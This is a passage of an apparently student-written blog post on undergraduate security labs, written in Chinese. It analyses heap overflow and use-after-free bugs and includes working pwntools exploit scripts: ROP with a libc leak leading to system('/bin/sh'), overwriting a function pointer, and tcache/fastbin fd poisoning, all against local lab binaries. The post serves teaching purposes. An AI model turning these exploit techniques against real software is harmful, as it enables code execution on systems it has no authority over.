class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./lab1-4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./lab1-4&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400753</span></span><br><span class="line">pop_rsi_pop_r15_ret = <span class="number">0x400751</span></span><br><span class="line"></span><br><span class="line">pop_rbp_ret = <span class="number">0x4005b8</span></span><br><span class="line">bss = <span class="number">0x601900</span></span><br><span class="line">read_addr = <span class="number">0x4006ac</span></span><br><span class="line">leave_addr = <span class="number">0x4006c3</span></span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">payload = padding</span><br><span class="line">payload += p64(bss + <span class="number">0x30</span> + <span class="number">0x30</span>)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.sendlineafter(&quot;your input:&quot;,payload)</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x4006c5</span></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload += p64(bss + <span class="number">0x30</span> - <span class="number">0x8</span>)</span><br><span class="line">payload += p64(leave_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u64(sh.recv(<span class="number">6</span>) + <span class="string">b&quot;\x00\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">base_addr = puts_real_addr - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system_addr = base_addr + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = base_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">payload = padding</span><br><span class="line">payload += p64(bss + <span class="number">0x30</span> + <span class="number">0x30</span>)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x400289</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = p64(ret_addr)</span></span><br><span class="line">payload = p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload += p64(bss + <span class="number">0x30</span> - <span class="number">0x8</span>)</span><br><span class="line">payload += p64(leave_addr)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="结果-2"><a href="#结果-2" class="headerlink" title="结果"></a>结果</h2><p><img src="/images/本科网络安全课实验/41.png" alt=""></p>
+<h2 id="一点注意"><a href="#一点注意" class="headerlink" title="一点注意"></a>一点注意</h2><p>bss的位置问题，理论上，我们上面说的这个bss变量可以在真正的bss附近，也就是0x600000后面的地址上，但经过实验表明，bss尽量大一点比较好，因为在执行system的时候，可能栈会跳转较大的范围，这时候栈帧有可能会跳转到只读区域，导致运行失败</p>
+<h1 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h1><p><em>照常理来讲，作业的难度是循序渐进的，上周有四个题，这周有一个题，那么恐怕这一题难度要顶四题，为此，做题之前把网上能找到的堆溢出手法翻了个遍，那酸爽，差点题还没开就跪了，拿到题之后，经过一番睿智的分析和讨论，突然发现这他妈不是后门大开吗</em></p>
+<p><strong><em>你这backdoor挺能藏啊</em></strong></p>
+<h2 id="检查-4"><a href="#检查-4" class="headerlink" title="检查"></a>检查</h2><p>使用checksec来查看，发现开启了NX和canary保护</p>
+<p><img src="/images/本科网络安全课实验/42.png" alt=""></p>
+<h2 id="运行-4"><a href="#运行-4" class="headerlink" title="运行"></a>运行</h2><p>直接运行，发现这是类似于一个经典的链表程序，每次选择增删查改的一种操作并执行：</p>
+<p><img src="/images/本科网络安全课实验/43.png" alt=""></p>
+<h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>打开之后，主要分析的点就是这个增删查改函数</p>
+<h3 id="addnode"><a href="#addnode" class="headerlink" title="addnode"></a>addnode</h3><p>为节省时间，直接反编译</p>
+<p><img src="/images/本科网络安全课实验/44.png" alt=""></p>
+<p>v4是64位系统的栈canary保护，我们这里用不到栈溢出，无视它</p>
+<p>下面的for循环是在a指向的地方寻找一个内容是null的指针，如果没有，继续向后找，所以我们推断a是内容为指针的数组，大小为9，每次addnote时会从a数组从前往后找到第一个还没被使用的指针，指向我们要开辟的堆空间</p>
+<p>v1作为长度被输入，下面有一个if循环判断v1是否小于80，若是，重新把v1改为80，意味着这个数组最短也得是80个字符，但有问题的地方来了，下面的malloc只开辟了0x30ull也就是48个字符的空间，把这个空间赋给了*((_QWORD *)&amp;a + v2)</p>
+<blockquote>
+<p>(_QWORD *)&amp;a就是把a转为64位指针，+v2是数组下标，最外面的*是取值，即把a[v2]处赋值为malloc的结果</p>
+</blockquote>
+<p>后面两句，把malloc出来的块进行了一个初始化**((_QWORD *)&amp;a + v2)就是这个块的初始位置，把本块长度记录在此，然后在紧接着的**((_QWORD *)&amp;a + v2)+8的位置，把dellall函数的地址记录下来了</p>
+<p>这样，我们可以画一个块的示意图：</p>
+<p><img src="/images/本科网络安全课实验/45.png" alt=""></p>
+<p>很显然我们只需要写入任意一个块超过48个字符，多余的字符就会溢出覆盖到下一个块</p>
+<h3 id="looknode"><a href="#looknode" class="headerlink" title="looknode"></a>looknode</h3><p><img src="/images/本科网络安全课实验/47.png" alt=""></p>
+<p>looknode里有一个反常的地方，可以看到在函数的最后，v2直接取出了写在块中的deleall函数地址，并直接执行了，看到v2()这样变量加括号的反常用法，我们立刻感到了不对劲，因为这样一来，我们利用前面的漏洞，直接把想要执行的代码地址放在某个块的deleall上，就可以实现在调用looknode时执行了</p>
+<h3 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h3><p>当天下午的进展就到了分析出几个主要函数的用途，但有一个很奇怪的点，就是在使用ROPgadget搜索gadget的时候，无意间发现本程序自带了system和”/bin/sh”，我觉得很奇怪，因为不自然，上面的增删查改功能没有任何一个需要system，于是猜测这程序有后门，但觉得如果真有那就太离谱，因为结合上面的分析，只需要把后门地址传过去，这题就做完了</p>
+<p>结果到了晚上一翻，后门就在sys函数里，sys夹在几个主要函数之间，愣是没注意到</p>
+<p>所以，这题就这样被解决了，最终的思路是，先两次addnode，开辟出索引为0，1的两个块，再writenode输入56任意字符+后门地址，然后looknode索引为1的那一块</p>
+<h2 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">conn = process(&quot;./experiment1&quot;)</span><br><span class="line"></span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(&quot;1&quot;)</span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(&quot;200&quot;)</span><br><span class="line"></span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(&quot;1&quot;)</span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(&quot;200&quot;)</span><br><span class="line"></span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(&quot;2&quot;)</span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(&quot;0&quot;)</span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(b&#x27;1&#x27; * (48 + 8) + p64(0x400a12))</span><br><span class="line"></span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(&quot;3&quot;)</span><br><span class="line">print(conn.recv())</span><br><span class="line">conn.sendline(&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="结果-3"><a href="#结果-3" class="headerlink" title="结果"></a>结果</h2><p><img src="/images/本科网络安全课实验/48.png" alt=""></p>
+<h1 id="堆溢出2"><a href="#堆溢出2" class="headerlink" title="堆溢出2"></a>堆溢出2</h1><h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><p>本次的实验代码运行起来和上次的基本一致，打开ida进行分析，先看addnode函数：</p>
+<p><img src="/images/本科网络安全课实验/49.png" alt=""></p>
+<p>本次的堆块大小为0x30，而字符串长度不超过32，即0x20，我们试着连续分配几个块：</p>
+<p><img src="/images/本科网络安全课实验/50.png" alt=""></p>
+<p>上图中我们连续分配了三个块，可以看到它们每块占用的地址都是40，为了更清楚地看到堆内每块的结构，我们输入一些字符：</p>
+<p><img src="/images/本科网络安全课实验/51.png" alt=""></p>
+<p>这里是填充之后的一个堆块，开头的绿色是prev指针，之后的黄色框是整个块的size，为0x40，之所以是0x41，是因为末三位有标记位不是0</p>
+<p>红色框的0x20个字节是我们输入的部分，后面的浅蓝色和深蓝色框分别是addnode中设定的size值和deleall函数指针</p>
+<p>显然，由于输入字符长度限制，直接覆盖已经无法覆盖到了，我们继续分析其它函数，找到deletenode</p>
+<p><img src="/images/本科网络安全课实验/52.png" alt=""></p>
+<p>这里有一个明显的漏洞：a[v1]被free掉之后没有赋null，这样做，尽管free掉了相应的堆块，a[v1]这个指针仍然指向了这块地址</p>
+<h2 id="FUA"><a href="#FUA" class="headerlink" title="FUA"></a>FUA</h2><p>我们知道，被free掉的堆块会进入一系列称之为bin的数据结构中，它们组成空闲堆块链表以待后续再分配，为了形成链表，堆块内部就会出现fd和bk指针，分别指向上一个空闲堆块和下一个空闲堆块，我们实际操作一下，只关注fd指针：</p>
+<p><img src="/images/本科网络安全课实验/53.png" alt=""></p>
+<p>我们按照从前到后的顺序来free掉之前申请的块，发现最先释放的块fd指针为0，之后的每一块都指向前一块地址+0x10的位置，构成链表，为什么不直接指向前一块的地址呢？因为每个堆块最开始都是0x10字节的prev和size字段，前一块地址+0x10才是我们malloc返回的位置</p>
+<p>那么，我们尝试再申请三个块，这时就会发现，我们先会申请到最后释放的块，也就是第三块，然后再是第二块，最后才会申请到第一块</p>
+<p>我们可以试着用不同的顺序来申请和释放内存，观察会发生什么</p>
+<p>那么，什么是FUA呢？FUA指的就是我们在某一块堆块被free掉之后再向其中写入内容。被free掉的堆块如何再写入内容呢？这个题就给了我们很好的例子：它free掉指针却没有给指针赋值为null，我们依然可以使用这个指针向其中写入内容，进而破坏本来的fd指针值</p>
+<p>这么说可能会难以理解，我们举例子来说明：假设我们按顺序free掉了0，1，2这三块，那么fd指针构成的链表就会是：2 -&gt; 1 -&gt; 0 -&gt; NULL。这时候，我们调用writenode函数，向已经被释放掉的块2中写入44444444，由于fd指针就在块的最开头这一位置，所以刚好就能把fd覆盖为44444444，这时候，链表变为：2 -&gt; 44444444，我们连续分配两个块，第一块就能得到原来的2，第二块就可以在内存为44444444处开辟空间</p>
+<p>换句话说，我们使用这种方式，就能把内存中的任意位置当成堆块，进而对内存的任意位置进行读写</p>
+<h2 id="劫持"><a href="#劫持" class="headerlink" title="劫持"></a>劫持</h2><p>知道了FUA，劫持的思路也就水到渠成了</p>
+<p>我们最终要把某一个块的deleall函数指针覆盖为sys函数地址，所以，我们需要：</p>
+<p>1.申请块1，起始地址为a，deleall函数指针在a + 0x30处</p>
+<p>2.申请块2，注意块2要与块1重叠，起始地址可以是a + 0x10或a + 0x20，总之能够写入到a + 0x30即可</p>
+<p>这样，我们必须把块申请到地址可控的位置，不能放在堆栈上，因为运行时我们是不知道堆栈的地址的，数据段就成为了我们的首选位置</p>
+<p>本实验中，我选了位置0x602060</p>
+<p>为了申请上面的两个块，我们需要：</p>
+<p>1.申请两个块，这两个块分别会被放入a[0]，a[1]，</p>
+<p>2.释放，注意释放顺序一定是先释放a[0]，再释放a[1]</p>
+<p>3.修改a[1]的fd指针，让本来指向a[0]的指针指向0x602060</p>
+<p>4.连续两次addnode，这时a[1]指向的块就会被赋予a[2]，a[3]就是0x602060</p>
+<blockquote>
+<p>感觉只释放一个块然后写入修改其fd指针的话应该也能做到，但似乎有某种机制导致只释放一个块就只能从bin里拿出一个块，所以这里要释放两个，以便于拿出两个</p>
+</blockquote>
+<p>5.重复上述2，3，4，4的时候改用地址0x602070，这时a[5]就是0x602070</p>
+<p>6.向a[5]中写入24个填充字符 + sys地址，覆盖a[3]的deleall函数</p>
+<p>7.查看a[3]，即调用looknode(3)</p>
+<h2 id="脚本-4"><a href="#脚本-4" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">chunk_addr = <span class="number">0x602060</span></span><br><span class="line">sys_addr = <span class="number">0x4009c7</span></span><br><span class="line"></span><br><span class="line">conn = process(<span class="string">&#x27;./experiment2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(p64(chunk_addr + i * <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	conn.recv()</span><br><span class="line">	conn.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">24</span> + p64(sys_addr))</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="结果-4"><a href="#结果-4" class="headerlink" title="结果"></a>结果</h2><p><img src="/images/本科网络安全课实验/54.png" alt=""></p>
+<h1 id="堆溢出3"><a href="#堆溢出3" class="headerlink" title="堆溢出3"></a>堆溢出3</h1><h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><p>先看addnode函数，发现结构又改变了：</p>
+<p><img src="/images/本科网络安全课实验/55.png" alt=""></p>
+<p>可见这次字符串长度限制变成了0x30也就是48个，试着分配一些堆块：</p>
+<p><img src="/images/本科网络安全课实验/56.png" alt=""></p>
+<p>每块的大小还是0x40，那么内部结构：</p>
+<p><img src="/images/本科网络安全课实验/57.png" alt=""></p>
+<p>可以看到这次可读入的位置很靠后，所以，有24个字符可以覆盖到下一个堆块的首部，根据堆结构，这些位置依次是prev，块size，fd</p>
+<p>值得注意的是先前free后没有赋null的漏洞已经没有了</p>
+<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>既然能直接修改fd，我们的思路和上次差不多</p>
+<p>只不过这次在地址x处开辟一块的步骤为：</p>
+<p>1.先开辟三块，0，1，2</p>
+<p>2.free掉0，2</p>
+<p>3.写入1，覆盖2的fd为x</p>
+<p>4.连续开辟两块，拿到2和x</p>
+<h2 id="脚本-5"><a href="#脚本-5" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">chunk_addr = <span class="number">0x602060</span></span><br><span class="line">sys_addr = <span class="number">0x4009e8</span></span><br><span class="line"></span><br><span class="line">conn = process(<span class="string">&#x27;./experiment3&#x27;</span>)</span><br><span class="line"><span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">32</span> + p64(<span class="number">0x41</span>) + p64(chunk_addr))</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">32</span> + p64(<span class="number">0x41</span>) + p64(chunk_addr - <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;120&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(p64(sys_addr) * <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">conn.recv()</span><br><span class="line">conn.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="结果-5"><a href="#结果-5" class="headerlink" title="结果"></a>结果</h2><p><img src="/images/本科网络安全课实验/58.png" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" rel="tag"># 二进制</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/01/17/%E5%AE%B9%E5%99%A8%E6%8A%80%E6%9C%AF/" rel="next" title="容器技术">
+                <i class="fa fa-chevron-left"></i> 容器技术
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2023/01/17/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2%E2%80%94%E2%80%9423%E5%B9%B4%E7%9A%84%E6%95%B4%E7%90%86%E5%92%8C%E6%9B%B4%E6%96%B0/" rel="prev" title="关于博客——23年的整理和更新">
+                关于博客——23年的整理和更新 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
